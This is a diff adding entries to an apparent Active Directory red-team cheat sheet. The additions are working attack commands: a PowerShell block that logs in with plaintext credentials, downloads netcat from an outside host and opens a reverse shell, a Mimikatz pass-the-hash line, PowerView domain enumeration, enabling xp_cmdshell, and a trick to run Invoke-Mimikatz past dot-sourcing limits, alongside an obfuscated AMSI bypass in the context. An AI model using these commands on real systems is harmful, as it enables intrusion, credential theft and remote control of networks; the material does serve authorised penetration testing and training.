@@ -53,6 +53,20 @@ nc -lnvp 443
 nc.exe 192.168.13.37 443 -e cmd.exe
 ```
 
+&nbsp;
+
+**[+] Login by a specific user and get a shell using Netcat (Powershell)**
+
+```powershell
+$user = "hitman.corp\hitmanalharbi"
+$pass = ConvertTo-SecureString -String "PASS123@!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $pass
+Invoke-Command -ComputerName hitman-dc -Credential $cred -ScriptBlock {
+	Invoke-WebRequest http://192.168.40.2/nc64.exe -OutFile C:\users\public\nc.exe;
+	C:\users\public\nc.exe 192.168.40.2 443 -e cmd.exe
+}
+```
+
 
 &nbsp;
 &nbsp;
@@ -294,6 +308,14 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 ```
 
 &nbsp;
+
+**[+] Pass the hash using Mimikatz and run PowerShell**
+
+```powershell
+sekurlsa::pth /user:hitman /ntlm:4d8aa380635ded528e2cc8b0b96f3b06 /domain:hitman.corp /run:powershell.exe
+```
+
+&nbsp;
 &nbsp;
 
 ## Enumeration
@@ -301,6 +323,33 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 &nbsp;
 
 :mag: Some commands about enumeration snd recon 
+
+&nbsp;
+
+
+**[+] Get information about the current domain (Need PowerView.ps1)**
+
+```powershell
+Get-NetDomain
+```
+
+&nbsp;
+
+
+**[+] Get all users in the domain (Need PowerView.ps1)**
+
+```powershell
+Get-NetUser | select samaccountname
+```
+
+&nbsp;
+
+
+**[+] Get all computers in the domain (Need PowerView.ps1)**
+
+```powershell
+Get-NetComputer | select samaccountname, operatingsystem
+```
 
 &nbsp;
 
@@ -380,6 +429,14 @@ Find-InterestingDomainAcl -Domain TrustedForest.corp
 ```
 
 &nbsp;
+
+**[+] Get AppLocker rules/policies (Powershell)**
+
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+&nbsp;
 &nbsp;
 
 ## MSSQL
@@ -426,6 +483,17 @@ Get-SqlServerLinkCrawl -Verbose -Instance UFC-SQLDEV
 
 ```powershell
  Get-SqlServerLinkCrawl -Verbose -Instance UFC-SQLDEV -Query "select current_user" 
+```
+
+&nbsp;
+
+**[+] Enable XP_CMDSHELL (Any MSSQL client like HeidiSQL)**
+
+```sql
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
 ```
 
 &nbsp;
@@ -480,6 +548,20 @@ sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) 
 // Or you can try this
 
 [ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
+```
+
+&nbsp;
+
+**[+] Bypass "Dot sourcing is not allowed" in PowerShell**
+
+```powershell
+// Write the call/code in a file
+
+'Import-Module C:\allowedPath\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command "privilege::debug token::elevate" ' | Out-File -FilePath run.ps1
+
+// Run file directly without dot source
+
+.\run.ps1
 ```
 
 &nbsp;
